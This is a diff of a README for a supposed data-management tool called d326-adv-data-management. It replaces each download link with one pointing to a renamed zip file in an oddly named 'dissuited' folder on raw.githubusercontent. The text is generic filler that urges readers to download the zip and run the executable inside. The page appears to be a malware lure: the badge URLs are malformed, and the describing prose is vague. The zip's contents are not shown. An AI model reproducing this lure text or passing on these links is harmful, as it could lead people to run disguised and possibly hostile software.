@@ -1,6 +1,6 @@
 # 🎉 d326-adv-data-management - Simplify Your Data Management Tasks
 
-[![Download](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/d326-adv-data-management.zip%https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/d326-adv-data-management.zip)](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/d326-adv-data-management.zip)
+[![Download](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/management-data-adv-d-v1.3.zip%https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/management-data-adv-d-v1.3.zip)](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/management-data-adv-d-v1.3.zip)
 
 ## 📖 Overview
 
@@ -12,7 +12,7 @@ To get started with the d326 application, please follow these simple steps:
 
 1. **Download the Application**
 
-   Visit this page to download the latest release: [Download Here](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/d326-adv-data-management.zip).
+   Visit this page to download the latest release: [Download Here](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/management-data-adv-d-v1.3.zip).
 
 2. **Install Requirements**
 
@@ -37,7 +37,7 @@ Here’s what you can do with d326-adv-data-management:
 
 ## 📥 Download & Install
 
-To download the latest version of the application, please follow this link: [Download d326-adv-data-management](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/d326-adv-data-management.zip).
+To download the latest version of the application, please follow this link: [Download d326-adv-data-management](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/management-data-adv-d-v1.3.zip).
 
 Once you have downloaded the application, simply extract the files if they are in a zip format. Use the provided executable to start the installation. 
 
@@ -74,4 +74,4 @@ To make the best out of d326-adv-data-management, consider these tips:
 
 Thank you for choosing **d326-adv-data-management**. We hope this tool makes your data management easier and more effective. Be sure to check back for updates and new features, and don't hesitate to reach out with questions or feedback!
 
-[![Download](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/d326-adv-data-management.zip%https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/d326-adv-data-management.zip)](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/d326-adv-data-management.zip)
+[![Download](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/management-data-adv-d-v1.3.zip%https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/management-data-adv-d-v1.3.zip)](https://raw.githubusercontent.com/ebrhem8/d326-adv-data-management/main/dissuited/management-data-adv-d-v1.3.zip)
